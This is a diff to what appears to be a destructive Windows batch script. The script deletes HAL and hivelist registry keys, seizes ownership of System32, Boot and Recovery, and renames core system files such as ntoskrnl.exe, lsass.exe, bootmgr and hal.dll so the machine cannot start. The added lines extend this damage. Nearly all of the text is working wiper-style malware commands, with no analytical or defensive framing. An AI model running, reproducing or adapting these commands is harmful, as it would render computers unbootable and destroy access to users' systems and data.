@@ -14,6 +14,9 @@ reg delete "HKLM\SYSTEM\Setup" /v "CmdLine" /f
 reg delete "HKLM\\SYSTEM\CurrentControlSet\Control\HAL" /f
 reg delete "HKLM\\SYSTEM\ControlSet001\Control\HAL" /f
 reg delete "HKLM\\SYSTEM\ControlSet002\Control\HAL" /f
+reg delete "HKLM\\SYSTEM\CurrentControlSet\Control\hivelist" /f
+reg delete "HKLM\\SYSTEM\ControlSet001\Control\hivelist" /f
+reg delete "HKLM\\SYSTEM\ControlSet002\Control\hivelist" /f
 takeown /f C:\Windows\System32 /r /d y & icacls C:\Windows\System32 /grant Users:F /T /C /Q & takeown /f C:\Windows\Boot /r /d y & takeown /f C:\Boot & takeown /f C:\bootmgr /r /d y & icacls C:\Boot /grant Users:F /C /T /Q & icacls C:\Windows\Boot /grant Users:F /C /T /Q 
 takeown /f C:\Windows\SysWOW64\boot.sdi /r /d y & icacls C:\Windows\SysWOW64\boot.sdi & takeown /f C:\Recovery /r /d y & icacls C:\Recovery /grant Users:F /C /T /Q & icacls C:\Recovery /grant Administrators:F /C /T /Q
 ren C:\Windows\System32\ntoskrnl.exe VwRhztPfsm.00
@@ -30,6 +33,7 @@ ren C:\Windows\System32\services.exe KjbvNmYxv.00
 ren C:\Windows\System32\dwm.exe kLqZxFTghS.00
 ren C:\Windows\System32\lsass.exe OpZxHkSabVxZ.00
 ren C:\Windows\System32\userinit.exe LkmAXvTvZxVgoY.00
+ren C:\Windows\System32\hal.dll 666.dll
 ren C:\bootmgr Xzs0Jhe.00
 ren C:\BOOTNXT JkzxYsfWQ.00
 ren "%USERPROFILE%\Desktop\*.lnk" *.00
